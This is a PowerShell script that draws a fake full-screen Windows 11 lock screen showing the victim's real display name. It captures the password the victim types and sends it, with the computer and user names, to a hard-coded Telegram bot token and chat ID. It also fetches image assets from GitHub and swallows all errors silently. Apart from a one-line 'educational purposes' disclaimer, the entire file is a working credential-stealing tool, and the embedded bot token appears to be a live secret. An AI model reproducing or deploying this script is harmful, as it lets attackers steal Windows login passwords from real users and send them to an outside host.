#Made by Deadfire for educational purposes and legal use in ethical hacking labs

# --- TELEGRAM CONFIGURATION, change it for ur self ---
$telegramToken = '8719343462:AAHrS9Hv_mwUSAfRkoe5yLXu9RXJZlXuto4'
$telegramChatId = '7587830896'
# --- END CONFIGURATION ---

try {
    # Load necessary assemblies
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # Get user and computer info
    $username = $env:USERNAME
    $computerName = $env:COMPUTERNAME
    $displayName = $username
    try {
        $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine')
        $userObj = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($context, $username)
        if ($userObj.DisplayName) {
            $displayName = $userObj.DisplayName
        }
    } catch {}

    # Setup temporary file paths
    $tempDir = $env:TEMP
    $bgTemp = Join-Path $tempDir "bg.jpg"
    $profileTemp = Join-Path $tempDir "profile.png"

    # Download images
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/background.jpg', $bgTemp)
    $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/profile.png', $profileTemp)

    # Load images
    $bgImage = [System.Drawing.Image]::FromFile($bgTemp)
    $profileImage = [System.Drawing.Image]::FromFile($profileTemp)

    # --- GUI SETUP ---

    # Main Form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = ''
    $form.ControlBox = $false
    $form.FormBorderStyle = 'None'
    $form.WindowState = 'Maximized'
    $form.TopMost = $true
    $form.BackgroundImage = $bgImage
    $form.BackgroundImageLayout = 'Stretch'

    # Dark Overlay
    $overlay = New-Object System.Windows.Forms.Panel
    $overlay.Dock = 'Fill'
    $overlay.BackColor = [System.Drawing.Color]::FromArgb(180, 0, 0, 0)
    $form.Controls.Add($overlay)

    # Clock
    $clockLabel = New-Object System.Windows.Forms.Label
    $clockLabel.Font = New-Object System.Drawing.Font('Segoe UI Light', 42)
    $clockLabel.ForeColor = 'White'
    $clockLabel.Text = Get-Date -Format 'HH:mm'
    $clockLabel.AutoSize = $true
    $clockLabel.Location = New-Object System.Drawing.Point(60, 50)
    $overlay.Controls.Add($clockLabel)

    # Date
    $dateLabel = New-Object System.Windows.Forms.Label
    $dateLabel.Font = New-Object System.Drawing.Font('Segoe UI Light', 22)
    $dateLabel.ForeColor = 'White'
    $dateLabel.Text = Get-Date -Format 'dddd, MMMM dd'
    $dateLabel.AutoSize = $true
    $dateLabel.Location = New-Object System.Drawing.Point(60, 110)
    $overlay.Controls.Add($dateLabel)

    # Login Container
    $loginContainer = New-Object System.Windows.Forms.Panel
    $loginContainer.Size = New-Object System.Drawing.Size(420, 500)
    $loginContainer.BackColor = [System.Drawing.Color]::Transparent
    $overlay.Controls.Add($loginContainer)
    $loginContainer.Left = ($form.ClientSize.Width - $loginContainer.Width) / 2
    $loginContainer.Top = ($form.ClientSize.Height - $loginContainer.Height) / 2

    # Profile Picture
    $profilePic = New-Object System.Windows.Forms.PictureBox
    $profilePic.Size = New-Object System.Drawing.Size(140, 140)
    $profilePic.Location = New-Object System.Drawing.Point(140, 30)
    $profilePic.Image = $profileImage
    $profilePic.SizeMode = 'StretchImage'
    $loginContainer.Controls.Add($profilePic)

    # Display Name
    $nameLabel = New-Object System.Windows.Forms.Label
    $nameLabel.Text = $displayName
    $nameLabel.Font = New-Object System.Drawing.Font('Segoe UI Semilight', 26)
    $nameLabel.ForeColor = 'White'
    $nameLabel.Size = New-Object System.Drawing.Size(420, 50)
    $nameLabel.Location = New-Object System.Drawing.Point(0, 180)
    $nameLabel.TextAlign = 'MiddleCenter'
    $loginContainer.Controls.Add($nameLabel)
    
    # Password Field
    $passwordBox = New-Object System.Windows.Forms.TextBox
    $passwordBox.Size = New-Object System.Drawing.Size(380, 50)
    $passwordBox.Location = New-Object System.Drawing.Point(20, 300)
    $passwordBox.Font = New-Object System.Drawing.Font('Segoe UI', 16)
    $passwordBox.PasswordChar = '●'
    $passwordBox.BackColor = '#333333'
    $passwordBox.ForeColor = 'White'
    $passwordBox.BorderStyle = 'FixedSingle'
    $loginContainer.Controls.Add($passwordBox)

    # "I forgot my PIN" Label
    $forgotPinLabel = New-Object System.Windows.Forms.Label
    $forgotPinLabel.Text = 'I forgot my PIN'
    $forgotPinLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11)
    $forgotPinLabel.ForeColor = '#CCCCCC'
    $forgotPinLabel.Size = New-Object System.Drawing.Size(420, 30)
    $forgotPinLabel.Location = New-Object System.Drawing.Point(0, 360)
    $forgotPinLabel.TextAlign = 'MiddleCenter'
    $forgotPinLabel.Cursor = 'Hand'
    $loginContainer.Controls.Add($forgotPinLabel)

    # Hidden Button for submission
    $submitButton = New-Object System.Windows.Forms.Button
    $submitButton.Size = New-Object System.Drawing.Size(1, 1)
    $submitButton.Location = New-Object System.Drawing.Point(-10, -10)
    $loginContainer.Controls.Add($submitButton)

    # --- EVENT HANDLERS ---

    # Password submission event
    $submitAction = {
        $password = $passwordBox.Text
        if ([string]::IsNullOrWhiteSpace($password)) {
            return
        }
        
        # Disable input
        $passwordBox.Enabled = $false
        
        # Send data to Telegram
        $message = "WINDOWS 11 LOGIN`nPC: $computerName`nUser: $username`nDisplay: $displayName`nPassword: $password`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$telegramChatId&text=$message"
        try {
            Invoke-RestMethod -Uri $telegramUrl -Method Get -ErrorAction Stop | Out-Null
        } catch {}
        
        # Close the form after a delay
        Start-Sleep -Seconds 2
        $form.Close()
    }

    $submitButton.Add_Click($submitAction)
    $passwordBox.Add_KeyDown({
        if ($_.KeyCode -eq 'Enter') {
            $submitButton.PerformClick()
        }
    })

    # Cleanup on form close
    $form.Add_FormClosed({
        $bgImage.Dispose()
        $profileImage.Dispose()
        Start-Sleep -Seconds 1
        Remove-Item $bgTemp -Force -ErrorAction SilentlyContinue
        Remove-Item $profileTemp -Force -ErrorAction SilentlyContinue
    })
    
    # Set focus on password box when form is shown
    $form.Add_Shown({
        $passwordBox.Focus()
    })

    # Run the application
    [System.Windows.Forms.Application]::Run($form)

} catch {
    # Silently fail
}
